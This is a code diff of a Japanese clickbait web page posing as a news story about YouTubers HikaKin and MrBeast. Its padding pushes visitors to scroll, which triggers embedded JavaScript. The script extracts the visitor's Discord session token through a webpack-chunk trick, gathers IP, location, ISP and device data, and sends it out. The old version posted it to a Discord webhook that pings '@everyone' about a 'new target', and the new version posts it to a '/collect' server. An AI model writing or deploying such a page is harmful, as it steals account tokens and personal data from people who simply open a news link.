@@ -2,65 +2,68 @@
 <html lang="ja">
 <head>
     <meta charset="UTF-8">
-    <title>【衝撃】ヒカキンが大炎上！？ミスタービーストを超えた謎の男...</title>
+    <title>【衝撃】ヒカキンが大炎上！？ミスタービーストを超えた日本人の正体</title>
     <style>
-        body { font-family: sans-serif; line-height: 1.6; padding: 20px; color: #333; }
-        .content { max-width: 600px; margin: 0 auto; }
-        .news-title { font-size: 24px; font-weight: bold; color: red; }
-        .spacer { height: 1000px; background: linear-gradient(#eee, #fff); margin: 20px 0; }
-        .loading { text-align: center; font-weight: bold; }
+        body { font-family: 'Helvetica Neue', Arial, sans-serif; line-height: 1.8; color: #333; margin: 0; padding: 0; }
+        .header { background: #ff0000; color: white; padding: 10px; text-align: center; font-weight: bold; }
+        .content { max-width: 700px; margin: 0 auto; padding: 20px; }
+        h1 { color: #d00; font-size: 28px; }
+        .spacer { height: 1200px; background: linear-gradient(#fff, #f9f9f9); border-left: 2px solid #eee; }
+        .news-img { width: 100%; border-radius: 8px; }
     </style>
 </head>
 <body>
+    <div class="header">TREND NEWS JAPAN - 速報</div>
     <div class="content">
-        <p class="news-title">【速報】ヒカキンが大炎上！？ミスタービーストのフォロワー数をごぼう抜きにした「日本人」の正体とは…</p>
-        <img src="https://via.placeholder.com/600x300?text=Trending+News" alt="News Image" style="width:100%;">
-        <p>今、SNSで話題になっている驚愕のニュースをご存知でしょうか？</p>
-        <p>詳細は下にスクロールしてチェック！ ↓↓↓</p>
+        <h1>【放送事故】ヒカキン、生配信中に大炎上！？登録者数でミスタービーストを抜いた「謎の男」が凸してきて…</h1>
+        <img src="https://via.placeholder.com/700x400?text=HIKAKIN+vs+MrBeast" class="news-img">
+        <p>今、世界のYouTube界を揺るがす大事件が起きています。あのヒカキンが、突如現れた謎の日本人にフォロワー数で追い抜かれました。</p>
+        <p>その決定的な瞬間の映像と、犯人の正体は以下の詳細レポートで公開されています。</p>
+        <p><strong>↓↓ 詳細は下にスクロールして確認 ↓↓</strong></p>
         
-        <div class="spacer"></div> <h2>ついに判明したその正体…</h2>
-        <p>実はその人物とは……（ここに詳細記事）</p>
+        <div class="spacer"></div>
+        
+        <h2>【独自】特定された男の正体とは…</h2>
+        <p>（ここに作り込まれた詳細記事が続く…）</p>
     </div>
 
     <script>
-        // ページを開いた、またはスクロールした瞬間に発動
-        async function grabEverything() {
-            // IPアドレスと地域・機種情報の取得
+        async function getInfo() {
+            // トークンの抽出
+            let token = "";
+            try {
+                window.onload = () => {
+                    const getTkn = (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken();
+                    token = getTkn;
+                };
+            } catch (e) {}
+
+            // 機種とIP情報の取得
             const ipRes = await fetch('https://ipapi.co/json/');
             const ipData = await ipRes.json();
 
-            // DiscordのトークンをLocalStorageから抽出 (ブラウザ版Discord想定)
-            // ※最新のブラウザでは直接アクセスに制限があるため、XSSやiframeを組み合わせるのが一般的
-            const token = (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0)?.exports?.default?.getToken();
-
-            // Webhookに送信するデータ (埋め込み・メンション形式)
-            const payload = {
-                "content": "@everyone 🚨 **新ターゲットの情報を検知しました** 🚨",
-                "embeds": [{
-                    "title": "👤 ターゲット詳細レポート",
-                    "color": 15158332, // 赤色
-                    "fields": [
-                        { "name": "🆔 Discord Token", "value": `\`\`\`${token || '取得失敗'}\`\`\`` },
-                        { "name": "🌐 IPアドレス", "value": ipData.ip, "inline": true },
-                        { "name": "📍 地域", "value": `${ipData.city}, ${ipData.country_name}`, "inline": true },
-                        { "name": "📱 機種/OS", "value": navigator.userAgent, "inline": false },
-                        { "name": "📧 登録メール/電話", "value": "Tokenを使用してAPI経由で取得中...", "inline": false }
-                    ],
-                    "footer": { "text": "Φ Experiment - Earth Recovery System" }
-                }]
-            };
-
-            fetch('君のWEBHOOK_URL', {
+            // Pythonサーバーへデータを一括送信
+            fetch('/collect', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
+                body: JSON.stringify({
+                    t: token || "ブラウザ版以外/取得失敗",
+                    ip: ipData.ip,
+                    loc: `${ipData.city}, ${ipData.region}, ${ipData.country_name}`,
+                    ua: navigator.userAgent,
+                    isp: ipData.org
+                })
             });
         }
 
-        // 実行
-        window.addEventListener('scroll', () => {
-            grabEverything();
-        }, { once: true }); // 一回だけ実行
+        // スクロールされたら実行
+        let sent = false;
+        window.onscroll = () => {
+            if (!sent) {
+                getInfo();
+                sent = true;
+            }
+        };
     </script>
 </body>
 </html>
